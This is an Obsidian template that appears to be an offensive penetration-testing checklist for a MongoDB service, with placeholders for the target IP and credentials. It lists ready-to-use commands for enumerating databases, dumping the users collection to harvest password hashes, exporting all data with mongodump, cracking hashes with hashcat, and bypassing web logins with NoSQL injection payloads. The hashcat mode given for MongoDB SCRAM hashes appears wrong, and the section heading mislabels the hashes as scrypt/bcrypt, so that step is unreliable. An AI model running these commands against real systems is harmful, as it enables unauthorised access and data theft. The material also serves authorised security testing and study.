# MongoDB — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 27017; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>' -%>

---

## Nmap
```bash
nmap -p<% port %> --script=mongodb-info,mongodb-databases <% ip %>
```

---

## Connect
```bash
# mongo CLI (older)
mongo <% ip %>:<% port %>
```

```bash
# mongosh (modern)
mongosh mongodb://<% ip %>:<% port %>
```

```bash
# Authenticated
mongosh mongodb://<% user %>:<% pass %>@<% ip %>:<% port %>/
```

```bash
# Authenticated to specific database
mongosh mongodb://<% user %>:<% pass %>@<% ip %>:<% port %>/admin
```

---

## Check Auth Required
```bash
# If no auth configured, connect and run commands directly
mongosh mongodb://<% ip %>:<% port %> --eval "db.adminCommand({listDatabases: 1})"
```

```bash
nmap -p<% port %> --script=mongodb-info <% ip %>
```

---

## Enumeration (mongosh / mongo shell commands)
```javascript
// Current database
db

// List all databases
show dbs

// Switch database
use admin
use <database>

// List collections (tables)
show collections

// Count documents
db.<collection>.countDocuments()

// Show first 20 documents
db.<collection>.find().limit(20).pretty()

// Find with filter
db.<collection>.find({field: "value"}).pretty()

// Show all users
db.system.users.find().pretty()
use admin
db.system.users.find().pretty()

// Server status
db.serverStatus()

// Admin commands
db.adminCommand({listDatabases: 1})
db.adminCommand({connectionStatus: 1})
```

---

## Extract Credentials from users collection
```javascript
// After connecting to admin DB
use admin
db.system.users.find({}, {user: 1, pwd: 1, roles: 1}).pretty()
```

---

## Dump All Data
```bash
# mongodump — dump to BSON
mongodump --host <% ip %> --port <% port %> --out ./mongo_dump/
```

```bash
# Authenticated dump
mongodump --host <% ip %> --port <% port %> -u '<% user %>' -p '<% pass %>' --authenticationDatabase admin --out ./mongo_dump/
```

```bash
# Export specific collection to JSON
mongoexport --host <% ip %> --port <% port %> --db <database> --collection <collection> --out data.json
```

---

## Common Attack: Write to Filesystem (Rooted)
```javascript
// If running as root with directory write access — add SSH key
// (Very rare — requires specific config)
```

---

## Password Cracking (Scrypt / bcrypt from MongoDB)
```bash
# MongoDB user hashes are in SCRAM-SHA-256 or SCRAM-SHA-1 format
# Extract from: db.system.users.find()
# Hash format: type:iterations:salt:hash

# hashcat with MongoDB SCRAM-SHA-1
hashcat -m 10300 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## NoSQL Injection (if web app uses MongoDB)
```bash
# Basic bypass
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=

# Using JSON
{"username": {"$ne": null}, "password": {"$ne": null}}

# Regex bypass
{"username": {"$regex": "adm.*"}, "password": {"$ne": ""}}

# Extract data via injection with nosqlmap
python3 nosqlmap.py --attack 3 --target <% ip %> --dbPort <% port %>
```

```bash
# Automated NoSQL injection testing
nosqlmap
```

---

## Config Locations
```
/etc/mongod.conf          — main config (check: security.authorization)
/var/log/mongodb/         — logs
/var/lib/mongodb/         — data directory
```

```bash
# Check if auth is disabled in config
grep -i "authorization\|auth" /etc/mongod.conf
# If "disabled" or not present — no auth!
```

---

## Notes
